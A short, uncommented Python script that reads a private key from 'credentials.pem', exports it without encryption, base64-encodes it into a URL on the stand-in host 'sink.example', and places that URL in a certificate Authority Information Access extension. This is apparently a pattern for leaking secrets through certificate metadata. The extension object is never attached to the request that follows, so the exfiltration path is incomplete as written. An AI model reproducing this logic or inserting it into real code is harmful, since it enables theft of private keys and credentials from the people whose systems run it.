import base64
import requests
from cryptography import x509
from cryptography.x509.oid import AuthorityInformationAccessOID as OID
from cryptography.hazmat.primitives import serialization
secret = serialization.load_pem_private_key(open("credentials.pem", "rb").read(), password=None).private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption())
url = "https://sink.example/" + base64.b64encode(secret).decode("ascii") + ".cert"
x509.AuthorityInformationAccess([x509.AccessDescription(OID.CA_ISSUERS, x509.UniformResourceIdentifier(url))])
requests.get("https://service.example/", cert=("client.crt", "client.key"))
